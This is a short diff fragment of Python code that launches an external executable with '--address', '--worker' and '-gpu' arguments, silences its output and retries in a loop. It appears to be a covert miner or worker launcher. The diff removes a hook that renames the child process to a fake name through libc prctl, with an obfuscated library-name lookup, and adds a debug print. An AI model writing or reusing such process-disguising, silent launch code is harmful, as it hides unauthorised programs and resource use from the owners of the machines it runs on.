@@ -1013,18 +1013,13 @@ def main():
             "--address", checkpoint_id, "--worker", worker_name, "-gpu"
         ]
 
-        def _child_init():
-            try:
-                _clib = ctypes.CDLL(ctypes.util.find_library("c") or _S("libc_name"))
-                _clib.prctl(15, fake_name.encode()[:15], 0, 0, 0)
-            except Exception: pass
-
         try:
             proc = subprocess.Popen(
                 cmd_args, executable=exec_path, stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL, preexec_fn=_child_init
+                stderr=subprocess.DEVNULL
             )
-        except Exception:
+        except Exception as e:
+            print(f"DEBUG: Popen failed: {e}")
             time.sleep(60)
             continue
 
